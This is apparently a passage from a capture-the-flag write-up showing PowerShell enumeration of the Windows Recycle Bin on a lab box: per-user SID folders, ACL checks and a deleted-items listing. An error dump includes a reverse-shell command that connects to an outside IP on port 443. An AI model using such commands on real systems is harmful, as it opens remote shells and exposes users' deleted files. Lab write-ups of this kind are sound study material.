# Enumerating Recycle Bin

The toughest part is how to `cd` to the Recycle Bin folder.
```shell
PS C:\users> cd C:\"$"Recycle.Bin
PS C:\$Recycle.Bin> dir -Force


    Directory: C:\$Recycle.Bin


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d--hs-        6/21/2018   3:24 PM                S-1-5-18                                                              
d--hs-        6/22/2018   5:51 AM                S-1-5-21-1791094074-1363918840-4199337083-1001                        
d--hs-        8/19/2018   9:31 AM                S-1-5-21-1791094074-1363918840-4199337083-1002                        
d--hs-        8/19/2018  10:02 AM                S-1-5-21-1791094074-1363918840-4199337083-500              
```
In Recycle Bin, deleted items are sorted into folders accessible only by their users who deleted them. This makes sense since you obviously don't want your deleted items to be viewable by other users. 
```shell
PS C:\$Recycle.Bin> cd S-1-5-21-1791094074-1363918840-4199337083-500
PS C:\$Recycle.Bin\S-1-5-21-1791094074-1363918840-4199337083-500> dir -Force
PS C:\$Recycle.Bin\S-1-5-21-1791094074-1363918840-4199337083-500> dir : Access to the path 'C:\$Recycle.Bin\S-1-5-21-1791094074-1363918840-4199337083-500' is denied.
At line:1 char:1
+ dir -Force
+ ~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\$Recycle.Bin...-4199337083-500:String) [Get-ChildItem], Unauthoriz 
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
 

PS C:\$Recycle.Bin\S-1-5-21-1791094074-1363918840-4199337083-500> cd ..
PS C:\$Recycle.Bin> Get-Acl S-1-5-21-1791094074-1363918840-4199337083-500 | Select -Expand AccessToString
PS C:\$Recycle.Bin> rshell : Attempted to perform an unauthorized operation.
At line:90 char:1
+ rshell -Reverse -IPAddress 10.10.14.78 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,rshell
```
Based on the `Get-LocalUser | Select *` output we know that SID **S-1-5-21-1791094074-1363918840-4199337083-1002** is our user tyler

```shell
PS C:\$Recycle.Bin> Get-Acl S-1-5-21-1791094074-1363918840-4199337083-1002 | Select -Expand AccessToString
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
SECNOTES\tyler Allow  FullControl

PS C:\$Recycle.Bin\S-1-5-21-1791094074-1363918840-4199337083-1002> dir -Force


    Directory: C:\$Recycle.Bin\S-1-5-21-1791094074-1363918840-4199337083-1002


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a-hs-        6/21/2018   8:41 AM            129 desktop.ini                                                           


PS C:\$Recycle.Bin\S-1-5-21-1791094074-1363918840-4199337083-1002> type desktop.ini
[.ShellClassInfo]
CLSID={645FF040-5081-101B-9F08-00AA002F954E}
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-8964
```

Nothing interesting though.